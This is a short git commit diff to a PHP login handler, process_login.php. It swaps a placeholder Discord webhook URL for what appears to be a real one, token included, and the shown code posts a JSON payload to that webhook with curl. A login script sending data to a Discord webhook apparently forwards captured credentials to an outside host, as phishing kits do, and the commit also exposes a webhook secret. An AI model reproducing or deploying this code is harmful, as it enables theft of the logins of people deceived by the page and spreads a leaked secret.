bedddb6891efddb51e65de43b8da229c77b0aef2
motivve <115065824+motivve@users.noreply.github.com>
2023-06-03 18:15:24 +0200

    Update process_login.php

--- image/process_login.php
+++ image/process_login.php
@@ -26,7 +26,7 @@ $payload = array(
 );
 
 // Send the JSON payload to the Discord webhook
-$webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
+$webhook_url = "https://discord.com/api/webhooks/1114587026633789531/mZI9cQRsN3j8MHIUbo9q81yK_vWk5kS7uuFHPtZJ4MpEe0lQCU4vOn9d3qt1zMovJGjx";
 $ch = curl_init($webhook_url);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
